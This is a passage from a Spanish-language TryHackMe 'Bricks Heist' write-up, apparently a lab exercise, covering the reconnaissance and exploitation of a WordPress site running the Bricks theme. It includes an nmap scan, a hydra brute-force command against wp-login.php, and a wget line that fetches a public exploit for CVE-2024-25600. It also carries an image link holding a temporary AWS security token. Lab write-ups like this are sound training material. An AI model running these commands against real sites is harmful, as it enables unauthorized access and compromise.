---
title: "Test"
platform: "THM"
publishedAt: 2025-05-09
cover: "/images/ctf/TExto Enriquesido.webp"
---

# 🧱 TryHackMe – Bricks Heist | Write-up técnico


![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/5e19dbac-6f69-4b8e-8f73-8ef638bf2a2c/8415f495-a0a4-4a8d-b258-ce28be57dfa6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4663AUYIKUS%2F20250511%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250511T034512Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAsaCXVzLXdlc3QtMiJHMEUCIQDezjFxU4lqbqWa481Vn%2F8kvomBZEHeDbYgeuFVs%2B5VxwIge1agb1A99UVWFY%2Ff6ea5m0ubJxh0Pp2Sacd7nJAmPDUqiAQItP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARAAGgw2Mzc0MjMxODM4MDUiDGYd3a00mUVQQSv%2FyCrcA%2B1RVfnhtn9FmG0GW4eFlr7ZY6jejKYKgXrb3sIkIZ%2FKA5xyZWxbkOgTohAgiOSPoVosPeuDtOamnBvV58JjnnD5QcU%2BZ8B%2BOQqVmMVLpSSRj0AXrftrwKrOKEDPRkB%2Bzq%2BT0tUpzY4qMWzAoBzDazJVDUG3lQuttrBWfkeEcso%2FvrLZW%2FMqRLPtWM0orFiTsOrGUfL8p45Ptuh82zenfzKeP4TgOovknROvIybZfEH5qKToibwoVLkrlwKfP4BEWonqeOMx7ChV6ONUCr%2Bv9liZHX061KN6HYOqSUP7HKt%2FzEMtkXNBS0wfpIE%2BahJyotiNbdBK%2BzeYhAez07dhj2%2B3yNesf7TkN0Mp%2FVUHbJOl5OHFzIpCMwfqLXiUPoqNIO701th3rdgBS4jYlrsJIep9CZlPH0%2BaJFN%2BwH63tlIIgswOx35iVOZ0TY3NHPMJPtV1iUK2ZQp8PeSD3MRkUviWGByTK9vb5y0m8lSuZBN5usshejtkkfaXCvvLC9w7cH67YIY53pzhM8u6NZG0brIf8imRN%2B1d1XbLzW8oGCccNOwqIj3teICUIuZ4GKQ7DcyiX0fkfmdv8UaK0jddi33IXzt1fx64ufXcrNrPeT3osqXuzRjYIf9ioDfEMNKcgMEGOqUB4UC9Au8t0M%2BVF8rfJJ3%2FQ2mT%2BNCdu9EZPSOPf6eo%2B5QPxTYucrufGGrPzv4klcNtAspFHH40kG8C0G0lLgeuY0hcBCpWXI%2BZ1VE6jTjqrnLA6cVV2XvrHfteyrSiZJVM2B3HXtN8dYeqlkv%2B2uDcDBGcHXvIpP%2FmtGeh4nQEp%2FNk8pub8awoVuX5NxbolH0vXnFzaRYubq7u8O5Tu1uihWAHF648&X-Amz-Signature=acc0e051efd02ba4c277edc71826c4f670b690d19e4bb28a9e55759c83524336&X-Amz-SignedHeaders=host&x-id=GetObject)


[https://www.villaarreola.com/_next/image?url=%2Fmedia%2Fbg.png&w=64&q=75](https://www.villaarreola.com/_next/image?url=%2Fmedia%2Fbg.png&w=64&q=75)


En este reto de TryHackMe nos enfrentamos a un escenario en el que un sitio WordPress ha sido comprometido por un actor malicioso. Nuestra misión es investigar, identificar cómo se produjo el ataque, qué malware fue desplegado, y qué grupo está detrás.


---


## 🔍 Reconocimiento inicial


Comenzamos con un escaneo completo:


```shell
bash
CopyEdit
nmap -sCV -p- 10.10.72.226
```


Se detectan los siguientes servicios:

- **22/tcp** – OpenSSH
- **80/tcp** – WebSockify (retorna error 405)
- **443/tcp** – Apache + WordPress 6.5
- **3306/tcp** – MySQL (sin autenticación)

---


## 🎯 Enumeración de WordPress


Usando `curl` y `wpscan`, identificamos que el tema activo es **Bricks**.


Al buscar vulnerabilidades conocidas, encontramos el CVE:

- **CVE-2024-25600**: vulnerabilidad crítica que permite ejecución remota de comandos desde el editor del tema Bricks.

---


## 🔓 Acceso inicial


Tras enumerar el usuario `administrator`, ejecutamos fuerza bruta con `hydra` y obtenemos acceso:


```shell
bash
CopyEdit
hydra -l administrator -P rockyou.txt https://bricks.thm -s 443 -S -f \
http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:S=Location: /wp-admin/"
```


---


## 💥 Explotación del CVE


Usamos el exploit público para el CVE-2024-25600:


```shell
bash
CopyEdit
wget https://raw.githubusercontent.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/main/CVE-2024-25600.py
```

